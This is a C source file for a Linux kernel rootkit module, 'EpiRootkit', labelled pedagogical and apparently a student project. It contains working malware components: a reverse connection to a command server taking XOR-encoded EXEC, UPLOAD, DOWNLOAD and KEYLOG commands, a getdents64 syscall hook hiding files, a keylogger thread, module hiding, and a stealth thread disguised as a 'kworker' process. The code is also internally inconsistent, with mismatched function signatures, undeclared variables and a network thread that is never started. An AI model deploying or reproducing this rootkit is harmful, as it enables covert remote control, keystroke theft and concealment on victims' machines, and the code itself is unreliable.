#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/uaccess.h>
#include <linux/mm.h>
#include <linux/syscalls.h>
#include <net/sock.h>
#include <linux/dirent.h>
#include <linux/version.h>
#include <linux/namei.h>
#include <linux/cred.h>
#include <linux/input.h>
#include <linux/spinlock.h>
#include <linux/ctype.h>
#include <linux/jiffies.h>
#include <linux/delay.h>
#include <linux/inet.h>
#include "epirootkit.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Team_Rodrien");
MODULE_DESCRIPTION("EpiRootkit - A pedagogical rootkit");
MODULE_VERSION("0.1");

// Global variables
struct rootkit_config config = {
    .port = 4444,
    .server_ip = "127.0.0.1",
    .buffer_size = 4096,
    .xor_key = "epita",
    .temp_output_file = "/tmp/rootkit_output",
    .command_prefix_auth = "AUTH",
    .command_prefix_exec = "EXEC",
    .command_prefix_upload = "UPLOAD",
    .command_prefix_download = "DOWNLOAD",
    .command_prefix_keylog = "KEYLOG",
    .command_prefix_length = 4,
    .shell_path = "/bin/sh",
    .shell_args = "-c",
    .path_env = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
    .hidden_dir = ".hidden",
    .max_hidden_lines = 100,
    .command_prefix_hide_line = "HIDE",
    .command_prefix_unhide_line = "UNHIDE"
};

struct keylog_config keylog_config = {
    .buffer_size = 1024,
    .flush_interval = HZ * 5  // 5 seconds
};

struct memory_manager mem_manager = {
    .nonpaged_memory = NULL,
    .size = 0,
    .lock = __SPIN_LOCK_UNLOCKED(mem_manager.lock)
};

struct network_manager net_manager = {
    .connection = NULL,
    .is_connected = false,
    .lock = __SPIN_LOCK_UNLOCKED(net_manager.lock),
    .thread = NULL
};

struct list_head dkom_entries = LIST_HEAD_INIT(dkom_entries);
struct list_head hook_entries = LIST_HEAD_INIT(hook_entries);
DEFINE_SPINLOCK(hook_lock);
DEFINE_SPINLOCK(dkom_lock);

struct task_struct *g_stealth_thread = NULL;
unsigned long *sys_call_table = NULL;
asmlinkage long (*original_getdents64)(const struct pt_regs *) = NULL;
asmlinkage long (*original_read)(const struct pt_regs *) = NULL;
asmlinkage long (*original_write)(const struct pt_regs *) = NULL;

static struct socket *g_connection_socket = NULL;
static struct task_struct *g_rootkit_thread = NULL;
static struct task_struct *g_keylog_thread = NULL;
static bool g_is_authenticated = false;
static char g_password[256] = "epita";
static struct list_head *g_prev_module = NULL;
static struct keylog_buffer *g_keylog_buffer = NULL;

static void exec_and_send_output(const char *command) {
    struct file *output_file;
    char *output_buffer;
    int read_result;
    mm_segment_t old_fs;
    loff_t pos = 0;

    output_file = filp_open(config.temp_output_file, O_RDONLY, 0);
    if (IS_ERR(output_file)) {
        send_error(ROOTKIT_ERROR_FILE, "Failed to open output file");
        return;
    }

    output_buffer = kmalloc(config.buffer_size, GFP_KERNEL);
    if (!output_buffer) {
        filp_close(output_file, NULL);
        send_error(ROOTKIT_ERROR_MEMORY, "Failed to allocate output buffer");
        return;
    }

    memset(output_buffer, 0, config.buffer_size);
    old_fs = get_fs();
    set_fs(KERNEL_DS);
    read_result = kernel_read(output_file, pos, output_buffer, config.buffer_size - 1);
    set_fs(old_fs);

    if (read_result < 0) {
        kfree(output_buffer);
        filp_close(output_file, NULL);
        send_error(ROOTKIT_ERROR_FILE, "Failed to read output file");
        return;
    }

    if (read_result > 0) {
        output_buffer[read_result] = '\0';
        send_data(output_buffer);
    } else {
        send_data("Command executed with no output.\n");
    }

    filp_close(output_file, NULL);
    kfree(output_buffer);
}

static int rootkit_thread(void *data) {
    char *recv_buf;
    struct kvec iov;
    struct msghdr msg = { .msg_flags = 0 };
    int len;

    recv_buf = kmalloc(config.buffer_size, GFP_KERNEL);
    if (!recv_buf)
        return -ENOMEM;

    while (!kthread_should_stop()) {
        memset(recv_buf, 0, config.buffer_size);
        iov.iov_base = recv_buf;
        iov.iov_len = config.buffer_size - 1;

        len = kernel_recvmsg(net_manager.connection, &msg, &iov, 1,
                             config.buffer_size - 1, 0);
        if (len <= 0)
            break;

        apply_xor_cipher(recv_buf, len);
        recv_buf[len] = '\0';
        process_command(recv_buf);
        msleep(100);
    }

    kfree(recv_buf);
    return 0;
}

static int connect_to_server(void) {
    struct sockaddr_in addr;
    int ret;

    ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP,
                           &g_connection_socket);
    if (ret < 0)
        return ret;

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(config.port);
    addr.sin_addr.s_addr = in_aton(config.server_ip);

    return g_connection_socket->ops->connect(g_connection_socket,
                                             (struct sockaddr *)&addr,
                                             sizeof(addr), 0);
}

static asmlinkage long hook_getdents64(const struct pt_regs *regs) {
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
    long ret = original_getdents64(regs);
    unsigned long off = 0;
    struct linux_dirent64 *dir, *kdirent, *prev = NULL;

    if (ret <= 0)
        return ret;

    kdirent = kzalloc(ret, GFP_KERNEL);
    if (!kdirent)
        return ret;

    if (copy_from_user(kdirent, dirent, ret)) {
        kfree(kdirent);
        return ret;
    }

    dir = kdirent;
    while (off < ret) {
        if (strstr(dir->d_name, config.hidden_dir)) {
            if (prev) {
                prev->d_reclen += dir->d_reclen;
                memmove(dir, (char *)dir + dir->d_reclen, ret - off - dir->d_reclen);
                ret -= dir->d_reclen;
            } else {
                memmove(dir, (char *)dir + dir->d_reclen, ret - off - dir->d_reclen);
                ret -= dir->d_reclen;
            }
        } else {
            prev = dir;
            off += dir->d_reclen;
            dir = (void *)dir + dir->d_reclen;
        }
    }

    if (copy_to_user(dirent, kdirent, ret)) {
        kfree(kdirent);
        return ret;
    }

    kfree(kdirent);
    return ret;
}

static int __init epirootkit_init(void) {
    g_keylog_thread = kthread_run(keylog_thread, NULL, "keylog_thread");
    if (IS_ERR(g_keylog_thread)) {
        g_keylog_thread = NULL;
    }
    
    g_stealth_thread = kthread_run(stealth_thread, NULL, "kworker/%d", 0);
    if (IS_ERR(g_stealth_thread)) {
        free_secure_memory(mem_manager.nonpaged_memory);
        return PTR_ERR(g_stealth_thread);
    }
    
    return 0;
}

static void __exit epirootkit_exit(void) {
    unsigned long flags;
    struct dkom_entry *entry, *tmp;
    struct hook_entry *hook_entry, *hook_tmp;

    if (net_manager.thread)
        kthread_stop(net_manager.thread);

    if (g_stealth_thread)
        kthread_stop(g_stealth_thread);

    if (g_keylog_thread)
        kthread_stop(g_keylog_thread);

    if (net_manager.connection) {
        sock_release(net_manager.connection);
        net_manager.connection = NULL;
    }

    if (sys_call_table) {
        sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
        sys_call_table[__NR_read] = (unsigned long)original_read;
        sys_call_table[__NR_write] = (unsigned long)original_write;
    }

    unhide_module();
    keylog_buffer_cleanup();

    if (mem_manager.nonpaged_memory) {
        free_secure_memory(mem_manager.nonpaged_memory);
        mem_manager.nonpaged_memory = NULL;
    }

    spin_lock_irqsave(&dkom_lock, flags);
    list_for_each_entry_safe(entry, tmp, &dkom_entries, list) {
        dkom_restore_object(entry->object);
        list_del(&entry->list);
        kfree(entry);
    }
    spin_unlock_irqrestore(&dkom_lock, flags);

    spin_lock_irqsave(&hook_lock, flags);
    list_for_each_entry_safe(hook_entry, hook_tmp, &hook_entries, list) {
        remove_hook(hook_entry->target);
        list_del(&hook_entry->list);
        kfree(hook_entry);
    }
    spin_unlock_irqrestore(&hook_lock, flags);
}

// Hook management
void remove_hook(struct hook_entry *entry) {
    if (!entry) return;
    
    // Restore original function
    if (entry->original) {
        *entry->target = entry->original;
    }
    
    // Remove from list
    list_del(&entry->list);
    kfree(entry);
}

// DKOM functions
void dkom_restore_object(struct dkom_entry *entry) {
    if (!entry) return;
    
    // Restore original object
    if (entry->original) {
        memcpy(entry->target, entry->original, entry->size);
    }
    
    // Remove from list
    list_del(&entry->list);
    kfree(entry);
}

// Keylogger functions
void keylog_buffer_cleanup(void) {
    // Clear keylog buffer
    memset(keylog_buffer, 0, KEYLOG_BUFFER_SIZE);
    keylog_buffer_index = 0;
}

// Module hiding
void unhide_module(void) {
    // Remove module from hidden list
    list_del(&module_list);
    module_hidden = false;
}

// Memory management
void free_secure_memory(void *ptr, size_t size) {
    if (!ptr) return;
    
    // Securely wipe memory before freeing
    memset(ptr, 0, size);
    kfree(ptr);
}

// Thread functions
int stealth_thread(void *data) {
    while (!kthread_should_stop()) {
        // Check if module is still hidden
        if (!module_hidden) {
            hide_module();
        }
        
        // Sleep for a while
        msleep(1000);
    }
    return 0;
}

int keylog_thread(void *data) {
    while (!kthread_should_stop()) {
        // Process keylog buffer
        if (keylog_buffer_index > 0) {
            // Send keylog data
            send_keylog_data();
            keylog_buffer_cleanup();
        }
        
        // Sleep for a while
        msleep(100);
    }
    return 0;
}

module_init(epirootkit_init);
module_exit(epirootkit_exit);